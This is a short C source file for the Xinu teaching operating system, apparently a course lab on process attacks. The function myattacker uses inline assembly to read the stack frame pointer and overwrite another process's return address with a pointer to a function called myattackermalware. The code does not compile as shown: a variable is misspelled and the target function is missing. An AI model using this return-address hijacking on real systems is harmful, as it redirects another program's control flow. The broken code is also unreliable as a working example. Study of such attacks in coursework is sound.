/* myattacker.c - myattacker */

#include <xinu.h> 
static unsigned long	*ebp;
/*------------------------------------------------------------------------
 *  myattacker  -  a process create by main
 *------------------------------------------------------------------------
 */
void myattacker()
{
	unsigned long *return_add; //the return address of victim

	asm("movl %ebp,ebp;");
	retrun_add = ebp+505;
	*return_add = &myattackermalware;
	return;
}